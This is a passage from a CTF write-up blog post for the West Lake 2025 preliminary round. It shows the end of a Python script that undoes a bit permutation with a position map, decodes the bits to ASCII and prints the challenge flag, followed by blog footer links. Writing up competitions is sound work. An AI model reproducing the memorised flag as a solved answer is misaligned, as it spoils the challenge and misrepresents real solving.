class="number">322</span>: <span class="number">187</span>, <span class="number">323</span>: <span class="number">481</span>, <span class="number">324</span>: <span class="number">208</span>, <span class="number">325</span>: <span class="number">732</span>, <span class="number">326</span>: <span class="number">243</span>, <span class="number">327</span>: <span class="number">554</span>, <span class="number">330</span>: <span class="number">640</span>, <span class="number">331</span>: <span class="number">43</span>, <span class="number">332</span>: <span class="number">689</span>, <span class="number">333</span>: <span class="number">578</span>, <span class="number">334</span>: <span class="number">16</span>, <span class="number">335</span>: <span class="number">597</span>, <span class="number">338</span>: <span class="number">196</span>, <span class="number">339</span>: <span class="number">514</span>, <span class="number">340</span>: <span class="number">147</span>, <span class="number">341</span>: <span class="number">444</span>, <span class="number">342</span>: <span class="number">305</span>, <span class="number">343</span>: <span class="number">300</span>, <span class="number">346</span>: <span class="number">684</span>, <span class="number">347</span>: <span class="number">740</span>, <span class="number">348</span>: <span class="number">693</span>, <span class="number">349</span>: <span class="number">754</span>, <span class="number">350</span>: <span class="number">23</span>, <span class="number">351</span>: <span class="number">258</span>, <span class="number">354</span>: <span class="number">132</span>, <span class="number">355</span>: <span class="number">421</span>, <span class="number">356</span>: <span class="number">257</span>, <span class="number">357</span>: <span class="number">717</span>, <span class="number">358</span>: <span class="number">101</span>, <span class="number">359</span>: <span class="number">398</span>, <span class="number">362</span>: <span class="number">34</span>, <span class="number">363</span>: <span class="number">40</span>, <span class="number">364</span>: <span class="number">359</span>, <span class="number">365</span>: <span class="number">637</span>, <span class="number">366</span>: <span class="number">250</span>, <span class="number">367</span>: <span class="number">56</span>, <span class="number">370</span>: <span class="number">182</span>, <span class="number">371</span>: <span class="number">720</span>, <span class="number">372</span>: <span class="number">667</span>, <span class="number">373</span>: <span class="number">353</span>, <span class="number">374</span>: <span class="number">423</span>, <span class="number">375</span>: <span class="number">573</span>, <span class="number">378</span>: <span class="number">41</span>, <span class="number">379</span>: <span class="number">626</span>, <span class="number">380</span>: <span class="number">197</span>, <span class="number">381</span>: <span class="number">91</span>, <span class="number">382</span>: <span class="number">30</span>, <span class="number">383</span>: <span class="number">5</span>, <span class="number">386</span>: <span class="number">639</span>, <span class="number">387</span>: <span class="number">469</span>, <span class="number">388</span>: <span class="number">35</span>, <span class="number">389</span>: <span class="number">726</span>, <span class="number">390</span>: <span class="number">427</span>, <span class="number">391</span>: <span class="number">752</span>, <span class="number">394</span>: <span class="number">478</span>, <span class="number">395</span>: <span class="number">122</span>, <span class="number">396</span>: <span class="number">251</span>, <span class="number">397</span>: <span class="number">558</span>, <span class="number">398</span>: <span class="number">595</span>, <span class="number">399</span>: <span class="number">664</span>, <span class="number">402</span>: <span class="number">612</span>, <span class="number">403</span>: <span class="number">213</span>, <span class="number">404</span>: <span class="number">484</span>, <span class="number">405</span>: <span class="number">418</span>, <span class="number">406</span>: <span class="number">102</span>, <span class="number">407</span>: <span class="number">201</span>, <span class="number">410</span>: <span class="number">628</span>, <span class="number">411</span>: <span class="number">692</span>, <span class="number">412</span>: <span class="number">743</span>, <span class="number">413</span>: <span class="number">308</span>, <span class="number">414</span>: <span class="number">696</span>, <span class="number">415</span>: <span class="number">540</span>, <span class="number">418</span>: <span class="number">552</span>, <span class="number">419</span>: <span class="number">19</span>, <span class="number">420</span>: <span class="number">496</span>, <span class="number">421</span>: <span class="number">370</span>, <span class="number">422</span>: <span class="number">510</span>, <span class="number">423</span>: <span class="number">502</span>, <span class="number">426</span>: <span class="number">681</span>, <span class="number">427</span>: <span class="number">407</span>, <span class="number">428</span>: <span class="number">762</span>, <span class="number">429</span>: <span class="number">20</span>, <span class="number">430</span>: <span class="number">632</span>, <span class="number">431</span>: <span class="number">501</span>, <span class="number">434</span>: <span class="number">279</span>, <span class="number">435</span>: <span class="number">4</span>, <span class="number">436</span>: <span class="number">584</span>, <span class="number">437</span>: <span class="number">574</span>, <span class="number">438</span>: <span class="number">708</span>, <span class="number">439</span>: <span class="number">3</span>, <span class="number">442</span>: <span class="number">414</span>, <span class="number">443</span>: <span class="number">415</span>, <span class="number">444</span>: <span class="number">383</span>, <span class="number">445</span>: <span class="number">175</span>, <span class="number">446</span>: <span class="number">321</span>, <span class="number">447</span>: <span class="number">238</span>, <span class="number">450</span>: <span class="number">454</span>, <span class="number">451</span>: <span class="number">319</span>, <span class="number">452</span>: <span class="number">599</span>, <span class="number">453</span>: <span class="number">88</span>, <span class="number">454</span>: <span class="number">335</span>, <span class="number">455</span>: <span class="number">457</span>, <span class="number">458</span>: <span class="number">659</span>, <span class="number">459</span>: <span class="number">763</span>, <span class="number">460</span>: <span class="number">339</span>, <span class="number">461</span>: <span class="number">617</span>, <span class="number">462</span>: <span class="number">709</span>, <span class="number">463</span>: <span class="number">649</span>, <span class="number">466</span>: <span class="number">713</span>, <span class="number">467</span>: <span class="number">500</span>, <span class="number">468</span>: <span class="number">627</span>, <span class="number">469</span>: <span class="number">28</span>, <span class="number">470</span>: <span class="number">331</span>, <span class="number">471</span>: <span class="number">650</span>, <span class="number">474</span>: <span class="number">506</span>, <span class="number">475</span>: <span class="number">311</span>, <span class="number">476</span>: <span class="number">244</span>, <span class="number">477</span>: <span class="number">46</span>, <span class="number">478</span>: <span class="number">173</span>, <span class="number">479</span>: <span class="number">756</span>, <span class="number">482</span>: <span class="number">655</span>, <span class="number">483</span>: <span class="number">385</span>, <span class="number">484</span>: <span class="number">620</span>, <span class="number">485</span>: <span class="number">567</span>, <span class="number">486</span>: <span class="number">156</span>, <span class="number">487</span>: <span class="number">146</span>, <span class="number">490</span>: <span class="number">690</span>, <span class="number">491</span>: <span class="number">222</span>, <span class="number">492</span>: <span class="number">585</span>, <span class="number">493</span>: <span class="number">471</span>, <span class="number">494</span>: <span class="number">589</span>, <span class="number">495</span>: <span class="number">231</span>, <span class="number">498</span>: <span class="number">193</span>, <span class="number">499</span>: <span class="number">488</span>, <span class="number">500</span>: <span class="number">130</span>, <span class="number">501</span>: <span class="number">695</span>, <span class="number">502</span>: <span class="number">636</span>, <span class="number">503</span>: <span class="number">144</span>, <span class="number">506</span>: <span class="number">220</span>, <span class="number">507</span>: <span class="number">750</span>, <span class="number">508</span>: <span class="number">348</span>, <span class="number">509</span>: <span class="number">73</span>, <span class="number">510</span>: <span class="number">592</span>, <span class="number">511</span>: <span class="number">748</span>, <span class="number">514</span>: <span class="number">389</span>, <span class="number">515</span>: <span class="number">205</span>, <span class="number">516</span>: <span class="number">17</span>, <span class="number">517</span>: <span class="number">392</span>, <span class="number">518</span>: <span class="number">192</span>, <span class="number">519</span>: <span class="number">672</span>, <span class="number">522</span>: <span class="number">212</span>, <span class="number">523</span>: <span class="number">202</span>, <span class="number">524</span>: <span class="number">48</span>, <span class="number">525</span>: <span class="number">511</span>, <span class="number">526</span>: <span class="number">129</span>, <span class="number">527</span>: <span class="number">539</span>, <span class="number">530</span>: <span class="number">191</span>, <span class="number">531</span>: <span class="number">10</span>, <span class="number">532</span>: <span class="number">151</span>, <span class="number">533</span>: <span class="number">449</span>, <span class="number">534</span>: <span class="number">108</span>, <span class="number">535</span>: <span class="number">358</span>, <span class="number">538</span>: <span class="number">145</span>, <span class="number">539</span>: <span class="number">430</span>, <span class="number">540</span>: <span class="number">72</span>, <span class="number">541</span>: <span class="number">652</span>, <span class="number">542</span>: <span class="number">391</span>, <span class="number">543</span>: <span class="number">60</span>, <span class="number">546</span>: <span class="number">336</span>, <span class="number">547</span>: <span class="number">521</span>, <span class="number">548</span>: <span class="number">707</span>, <span class="number">549</span>: <span class="number">345</span>, <span class="number">550</span>: <span class="number">651</span>, <span class="number">551</span>: <span class="number">44</span>, <span class="number">554</span>: <span class="number">543</span>, <span class="number">555</span>: <span class="number">369</span>, <span class="number">556</span>: <span class="number">160</span>, <span class="number">557</span>: <span class="number">95</span>, <span class="number">558</span>: <span class="number">55</span>, <span class="number">559</span>: <span class="number">588</span>, <span class="number">562</span>: <span class="number">404</span>, <span class="number">563</span>: <span class="number">704</span>, <span class="number">564</span>: <span class="number">6</span>, <span class="number">565</span>: <span class="number">338</span>, <span class="number">566</span>: <span class="number">282</span>, <span class="number">567</span>: <span class="number">87</span>, <span class="number">570</span>: <span class="number">355</span>, <span class="number">571</span>: <span class="number">568</span>, <span class="number">572</span>: <span class="number">266</span>, <span class="number">573</span>: <span class="number">326</span>, <span class="number">574</span>: <span class="number">420</span>, <span class="number">575</span>: <span class="number">436</span>, <span class="number">578</span>: <span class="number">342</span>, <span class="number">579</span>: <span class="number">371</span>, <span class="number">580</span>: <span class="number">493</span>, <span class="number">581</span>: <span class="number">207</span>, <span class="number">582</span>: <span class="number">745</span>, <span class="number">583</span>: <span class="number">37</span>, <span class="number">586</span>: <span class="number">294</span>, <span class="number">587</span>: <span class="number">381</span>, <span class="number">588</span>: <span class="number">327</span>, <span class="number">589</span>: <span class="number">741</span>, <span class="number">590</span>: <span class="number">699</span>, <span class="number">591</span>: <span class="number">531</span>, <span class="number">594</span>: <span class="number">753</span>, <span class="number">595</span>: <span class="number">711</span>, <span class="number">596</span>: <span class="number">253</span>, <span class="number">597</span>: <span class="number">518</span>, <span class="number">598</span>: <span class="number">264</span>, <span class="number">599</span>: <span class="number">51</span>, <span class="number">602</span>: <span class="number">666</span>, <span class="number">603</span>: <span class="number">609</span>, <span class="number">604</span>: <span class="number">606</span>, <span class="number">605</span>: <span class="number">1</span>, <span class="number">606</span>: <span class="number">154</span>, <span class="number">607</span>: <span class="number">260</span>, <span class="number">610</span>: <span class="number">141</span>, <span class="number">611</span>: <span class="number">561</span>, <span class="number">612</span>: <span class="number">159</span>, <span class="number">613</span>: <span class="number">11</span>, <span class="number">614</span>: <span class="number">351</span>, <span class="number">615</span>: <span class="number">53</span>, <span class="number">618</span>: <span class="number">198</span>, <span class="number">619</span>: <span class="number">429</span>, <span class="number">620</span>: <span class="number">759</span>, <span class="number">621</span>: <span class="number">456</span>, <span class="number">622</span>: <span class="number">164</span>, <span class="number">623</span>: <span class="number">445</span>, <span class="number">626</span>: <span class="number">190</span>, <span class="number">627</span>: <span class="number">644</span>, <span class="number">628</span>: <span class="number">378</span>, <span class="number">629</span>: <span class="number">172</span>, <span class="number">630</span>: <span class="number">195</span>, <span class="number">631</span>: <span class="number">32</span>, <span class="number">634</span>: <span class="number">541</span>, <span class="number">635</span>: <span class="number">74</span>, <span class="number">636</span>: <span class="number">373</span>, <span class="number">637</span>: <span class="number">509</span>, <span class="number">638</span>: <span class="number">643</span>, <span class="number">639</span>: <span class="number">309</span>, <span class="number">642</span>: <span class="number">702</span>, <span class="number">643</span>: <span class="number">417</span>, <span class="number">644</span>: <span class="number">230</span>, <span class="number">645</span>: <span class="number">727</span>, <span class="number">646</span>: <span class="number">33</span>, <span class="number">647</span>: <span class="number">614</span>, <span class="number">650</span>: <span class="number">64</span>, <span class="number">651</span>: <span class="number">670</span>, <span class="number">652</span>: <span class="number">395</span>, <span class="number">653</span>: <span class="number">171</span>, <span class="number">654</span>: <span class="number">183</span>, <span class="number">655</span>: <span class="number">292</span>, <span class="number">658</span>: <span class="number">642</span>, <span class="number">659</span>: <span class="number">180</span>, <span class="number">660</span>: <span class="number">534</span>, <span class="number">661</span>: <span class="number">535</span>, <span class="number">662</span>: <span class="number">661</span>, <span class="number">663</span>: <span class="number">603</span>, <span class="number">666</span>: <span class="number">571</span>, <span class="number">667</span>: <span class="number">634</span>, <span class="number">668</span>: <span class="number">236</span>, <span class="number">669</span>: <span class="number">189</span>, <span class="number">670</span>: <span class="number">124</span>, <span class="number">671</span>: <span class="number">516</span>, <span class="number">674</span>: <span class="number">464</span>, <span class="number">675</span>: <span class="number">298</span>, <span class="number">676</span>: <span class="number">47</span>, <span class="number">677</span>: <span class="number">178</span>, <span class="number">678</span>: <span class="number">411</span>, <span class="number">679</span>: <span class="number">360</span>, <span class="number">682</span>: <span class="number">402</span>, <span class="number">683</span>: <span class="number">700</span>, <span class="number">684</span>: <span class="number">186</span>, <span class="number">685</span>: <span class="number">65</span>, <span class="number">686</span>: <span class="number">590</span>, <span class="number">687</span>: <span class="number">206</span>, <span class="number">690</span>: <span class="number">324</span>, <span class="number">691</span>: <span class="number">163</span>, <span class="number">692</span>: <span class="number">341</span>, <span class="number">693</span>: <span class="number">452</span>, <span class="number">694</span>: <span class="number">161</span>, <span class="number">695</span>: <span class="number">482</span>, <span class="number">698</span>: <span class="number">613</span>, <span class="number">699</span>: <span class="number">396</span>, <span class="number">700</span>: <span class="number">472</span>, <span class="number">701</span>: <span class="number">548</span>, <span class="number">702</span>: <span class="number">26</span>, <span class="number">703</span>: <span class="number">483</span>, <span class="number">706</span>: <span class="number">333</span>, <span class="number">707</span>: <span class="number">103</span>, <span class="number">708</span>: <span class="number">194</span>, <span class="number">709</span>: <span class="number">38</span>, <span class="number">710</span>: <span class="number">219</span>, <span class="number">711</span>: <span class="number">520</span>, <span class="number">714</span>: <span class="number">532</span>, <span class="number">715</span>: <span class="number">557</span>, <span class="number">716</span>: <span class="number">363</span>, <span class="number">717</span>: <span class="number">272</span>, <span class="number">718</span>: <span class="number">357</span>, <span class="number">719</span>: <span class="number">470</span>, <span class="number">722</span>: <span class="number">387</span>, <span class="number">723</span>: <span class="number">356</span>, <span class="number">724</span>: <span class="number">80</span>, <span class="number">725</span>: <span class="number">225</span>, <span class="number">726</span>: <span class="number">320</span>, <span class="number">727</span>: <span class="number">602</span>, <span class="number">730</span>: <span class="number">426</span>, <span class="number">731</span>: <span class="number">361</span>, <span class="number">732</span>: <span class="number">315</span>, <span class="number">733</span>: <span class="number">297</span>, <span class="number">734</span>: <span class="number">216</span>, <span class="number">735</span>: <span class="number">302</span>, <span class="number">738</span>: <span class="number">668</span>, <span class="number">739</span>: <span class="number">577</span>, <span class="number">740</span>: <span class="number">118</span>, <span class="number">741</span>: <span class="number">139</span>, <span class="number">742</span>: <span class="number">350</span>, <span class="number">743</span>: <span class="number">267</span>, <span class="number">746</span>: <span class="number">486</span>, <span class="number">747</span>: <span class="number">490</span>, <span class="number">748</span>: <span class="number">177</span>, <span class="number">749</span>: <span class="number">86</span>, <span class="number">750</span>: <span class="number">117</span>, <span class="number">751</span>: <span class="number">607</span>, <span class="number">754</span>: <span class="number">459</span>, <span class="number">755</span>: <span class="number">761</span>, <span class="number">756</span>: <span class="number">242</span>, <span class="number">757</span>: <span class="number">68</span>, <span class="number">758</span>: <span class="number">475</span>, <span class="number">759</span>: <span class="number">394</span>, <span class="number">762</span>: <span class="number">467</span>, <span class="number">763</span>: <span class="number">580</span>, <span class="number">764</span>: <span class="number">328</span>, <span class="number">765</span>: <span class="number">62</span>, <span class="number">766</span>: <span class="number">733</span>, <span class="number">767</span>: <span class="number">143</span>, <span class="number">1</span>: <span class="number">443</span>, <span class="number">9</span>: <span class="number">70</span>, <span class="number">17</span>: <span class="number">723</span>, <span class="number">25</span>: <span class="number">82</span>, <span class="number">33</span>: <span class="number">647</span>, <span class="number">41</span>: <span class="number">78</span>, <span class="number">49</span>: <span class="number">277</span>, <span class="number">57</span>: <span class="number">49</span>, <span class="number">65</span>: <span class="number">45</span>, <span class="number">73</span>: <span class="number">685</span>, <span class="number">81</span>: <span class="number">563</span>, <span class="number">89</span>: <span class="number">413</span>, <span class="number">97</span>: <span class="number">247</span>, <span class="number">105</span>: <span class="number">729</span>, <span class="number">113</span>: <span class="number">39</span>, <span class="number">121</span>: <span class="number">576</span>, <span class="number">129</span>: <span class="number">517</span>, <span class="number">137</span>: <span class="number">318</span>, <span class="number">145</span>: <span class="number">362</span>, <span class="number">153</span>: <span class="number">104</span>, <span class="number">161</span>: <span class="number">598</span>, <span class="number">169</span>: <span class="number">687</span>, <span class="number">177</span>: <span class="number">239</span>, <span class="number">185</span>: <span class="number">283</span>, <span class="number">193</span>: <span class="number">749</span>, <span class="number">201</span>: <span class="number">605</span>, <span class="number">209</span>: <span class="number">63</span>, <span class="number">217</span>: <span class="number">347</span>, <span class="number">225</span>: <span class="number">366</span>, <span class="number">233</span>: <span class="number">691</span>, <span class="number">241</span>: <span class="number">508</span>, <span class="number">249</span>: <span class="number">489</span>, <span class="number">257</span>: <span class="number">529</span>, <span class="number">265</span>: <span class="number">105</span>, <span class="number">273</span>: <span class="number">633</span>, <span class="number">281</span>: <span class="number">524</span>, <span class="number">289</span>: <span class="number">446</span>, <span class="number">297</span>: <span class="number">736</span>, <span class="number">305</span>: <span class="number">686</span>, <span class="number">313</span>: <span class="number">365</span>, <span class="number">321</span>: <span class="number">409</span>, <span class="number">329</span>: <span class="number">15</span>, <span class="number">337</span>: <span class="number">463</span>, <span class="number">345</span>: <span class="number">343</span>, <span class="number">353</span>: <span class="number">433</span>, <span class="number">361</span>: <span class="number">332</span>, <span class="number">369</span>: <span class="number">96</span>, <span class="number">377</span>: <span class="number">121</span>, <span class="number">385</span>: <span class="number">169</span>, <span class="number">393</span>: <span class="number">349</span>, <span class="number">401</span>: <span class="number">368</span>, <span class="number">409</span>: <span class="number">680</span>, <span class="number">417</span>: <span class="number">393</span>, <span class="number">425</span>: <span class="number">188</span>, <span class="number">433</span>: <span class="number">278</span>, <span class="number">441</span>: <span class="number">682</span>, <span class="number">449</span>: <span class="number">410</span>, <span class="number">457</span>: <span class="number">735</span>, <span class="number">465</span>: <span class="number">18</span>, <span class="number">473</span>: <span class="number">138</span>, <span class="number">481</span>: <span class="number">522</span>, <span class="number">489</span>: <span class="number">174</span>, <span class="number">497</span>: <span class="number">255</span>, <span class="number">505</span>: <span class="number">200</span>, <span class="number">513</span>: <span class="number">291</span>, <span class="number">521</span>: <span class="number">271</span>, <span class="number">529</span>: <span class="number">21</span>, <span class="number">537</span>: <span class="number">76</span>, <span class="number">545</span>: <span class="number">579</span>, <span class="number">553</span>: <span class="number">9</span>, <span class="number">561</span>: <span class="number">94</span>, <span class="number">569</span>: <span class="number">134</span>, <span class="number">577</span>: <span class="number">441</span>, <span class="number">585</span>: <span class="number">137</span>, <span class="number">593</span>: <span class="number">533</span>, <span class="number">601</span>: <span class="number">764</span>, <span class="number">609</span>: <span class="number">27</span>, <span class="number">617</span>: <span class="number">135</span>, <span class="number">625</span>: <span class="number">600</span>, <span class="number">633</span>: <span class="number">618</span>, <span class="number">641</span>: <span class="number">287</span>, <span class="number">649</span>: <span class="number">688</span>, <span class="number">657</span>: <span class="number">312</span>, <span class="number">665</span>: <span class="number">116</span>, <span class="number">673</span>: <span class="number">551</span>, <span class="number">681</span>: <span class="number">703</span>, <span class="number">689</span>: <span class="number">245</span>, <span class="number">697</span>: <span class="number">596</span>, <span class="number">705</span>: <span class="number">52</span>, <span class="number">713</span>: <span class="number">424</span>, <span class="number">721</span>: <span class="number">296</span>, <span class="number">729</span>: <span class="number">675</span>, <span class="number">737</span>: <span class="number">184</span>, <span class="number">745</span>: <span class="number">434</span>, <span class="number">753</span>: <span class="number">408</span>, <span class="number">761</span>: <span class="number">653</span>&#125;</span><br><span class="line"></span><br><span class="line">encode_str = <span class="string">&#x27;000011000110000101001000001110100000000101000100110100101000110111001010000010111011100000000010101100011100010110001000011001000110011101101001001001100110100100010001110001110100011100011111110111001011011100001110000110100101000011000011010101110000110101110101101011110000000101011000000101001010001000001010111111111100100010001100000001011101100101000000111101101010001100010110001000010101101100111101111111110101100111000010111110110101010010000011100000011011010010001110011010100101000000011100000010001010010110111000111001000100110101000001101000110001001000000000111100001100100000001010100101101010101001111001010010001111000101011011001001001101000010011101011101011011011110101000110110101000011001000100001101110000101110110000010001000010010001001100&#x27;</span></span><br><span class="line"></span><br><span class="line">decode_str = [<span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">768</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encode_str)):</span><br><span class="line">    key = [k <span class="keyword">for</span> k, v <span class="keyword">in</span> change_map.items() <span class="keyword">if</span> v == i]</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        decode_str[key[<span class="number">0</span>]] = encode_str[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join(decode_str))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_str[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binary_to_string(<span class="string">&#x27;&#x27;</span>.join(decode_str)))</span><br><span class="line"><span class="comment">#fbthbp4DseaBQ3xQTidMDRFiNtYXj4tEyFGB2pFNwDpEMAnkt5xwdW8wpf5BKxhhZz0SDapKFRKJJErb5jATs5yZ3HNY0hTi</span></span><br></pre></td></tr></table></figure>

<p>最后get flag:<code>fbthbp4DseaBQ3xQTidMDRFiNtYXj4tEyFGB2pFNwDpEMAnkt5xwdW8wpf5BKxhhZz0SDapKFRKJJErb5jATs5yZ3HNY0hTi</code>直接交即可</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://github.com/GamerNoTitle">GamerNoTitle</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bili33.top/posts/CTF-West-Lake-2025-Preliminary-round-Writeup/">https://bili33.top/posts/CTF-West-Lake-2025-Preliminary-round-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">西湖论剑</a></div><div class="post_share"><div class="social-share" data-image="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/msedge_P4uXrm8qF2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/WeChat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/WeChat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/AliPay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/AliPay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/Move-My-Email-to-Larksuite/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Move-My-Email-to-Larksuite/Lark_aolEnaDRl9.png" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">迁移自定义域名邮箱服务到Larksuite（飞书国际版）</div></div></a></div><div class="next-post pull-right"><a href="/posts/CTF-CCSSSC2025-Preliminary-round-Writeup/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-CCSSSC2025-Preliminary-round-Writeup/msedge_SoaFIuETFA.png" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">【Volcania】第十八届2025软件系统安全赛华南赛区（CCSSSC2025）Writeup - TEAM Volcania</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/ADCTF2024-Writeup/" title="ADCTF2024 个人Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-07</div><div class="title">ADCTF2024 个人Writeup</div></div></a></div><div><a href="/posts/BaseCTF2024-Writeup/" title="BaseCTF2024 个人Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/BaseCTF2024-Week1/msedge_uIfC9jDQCq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-30</div><div class="title">BaseCTF2024 个人Writeup</div></div></a></div><div><a href="/posts/CTF-20220529/" title="2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-29</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp</div></div></a></div><div><a href="/posts/CTF-20220619/" title="2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-20220619/Cover.jpg?download=true" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-19</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp</div></div></a></div><div><a href="/posts/CTF-20220826-wangdingcup-qinglong/" title="2022网鼎杯青龙组——个人WriteUP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-26</div><div class="title">2022网鼎杯青龙组——个人WriteUP</div></div></a></div><div><a href="/posts/CTF-CCSSSC2025-National-Finals/" title="第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-CCSSSC2025-National-Finals/1748174171442.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-25</div><div class="title">第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="author-info__name">GamerNoTitle</div><div class="author-info__description">TECH OTAKUS SAVE THE WORLD</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" href="https://github.com/GamerNoTitle"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/GamerNoTitle" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://space.bilibili.com/44666814" target="_blank" title="bilibili"><i class="fas fa-tv"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a><a class="social-icon" href="mailto:GamerNoTitle@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><div align="center"><pre style="font-family: monospace; white-space: pre; 